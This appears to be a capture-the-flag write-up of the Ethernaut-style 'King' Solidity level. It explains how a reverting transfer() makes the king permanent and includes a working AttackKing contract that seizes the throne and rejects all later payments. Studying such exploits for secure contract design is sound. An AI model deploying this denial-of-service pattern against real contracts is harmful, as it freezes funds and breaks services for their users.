# KING: DoS 

## Vulnerable Contract
- recieve:
  - sends ether to current king if value is ==> than current prize.
  - sets king equal to new king
  - prize is == to msg.value

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
## 🚨 Risks with This Line: 
```payable(king).transfer(msg.value);```
  - Denial of Service (DoS) via Reverting Contract
    - If someone becomes the king using a contract with no fallback/receive function, or with one that explicitly reverts, then:
    - The next time someone sends Ether, this transfer() line will revert.
    - This makes the current king permanent, because the contract is "stuck" trying to send them Ether but failing.

-  Gas Limit Assumptions Are Obsolete
    - transfer() was historically recommended for safety (limited gas), but:
   - Since EIP-1884, certain operations cost more gas.
   - The 2300 gas limit may not always be safe or sufficient.
   - New best practices discourage the use of transfer() in favor of call.



## Attacker Contract:
 - When deployed:
   - send ether to King contract (now we're king)
 - receive():
   -  when we're dethrown, King contract sends ether to us.
   -  revert() is triggered, thus a Denial of service attack as contract is stuck
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    constructor(address payable _kingContract) payable {
        (bool sent, ) = _kingContract.call{value: msg.value}("");
        require(sent, "Transfer failed");

    }
       // Any attempt to send Ether to this contract will revert
    receive() external payable { 
        revert("intensionally");
    }
}
```

🧠 Key Insight
- .transfer() is brittle because:
 - It forwards only 2300 gas
 - It reverts if anything goes wrong
 - It doesn’t let you recover or handle failures
 - Contracts that intentionally reject Ether or are incompatible with transfer() will break it
